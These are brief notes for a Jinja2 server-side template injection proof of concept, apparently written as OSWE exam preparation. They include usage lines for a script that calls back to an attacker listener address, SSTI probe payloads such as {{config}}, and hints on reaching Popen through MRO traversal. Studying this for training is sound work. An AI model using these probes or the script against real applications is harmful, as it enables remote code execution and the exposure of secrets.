# SSTI Jinja2 RCE PoC Notes

## Vulnerability Summary
- **Target**: Flask/Jinja2 applications with user input in templates
- **Type**: Server-Side Template Injection → RCE
- **Impact**: Remote code execution, sensitive data exposure

## Key Concepts
Template engines evaluate expressions. If user input is directly embedded in templates, attackers can inject template directives to execute code.

## Quick Usage
```bash
# Test for SSTI
python3 poc.py 192.168.1.10 5000 10.10.14.5 4444

# Read Flask config
python3 poc.py 192.168.1.10 5000 10.10.14.5 4444 --command read_config
```

## OSWE Exam Tips
- Test {{7*7}} first (should return 49)
- {{config}} leaks Flask configuration
- MRO exploitation: Access __class__.__mro__ to reach Popen
- Index [414] varies by Python version - may need to enumerate

## References
- PortSwigger: https://portswigger.net/research/server-side-template-injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
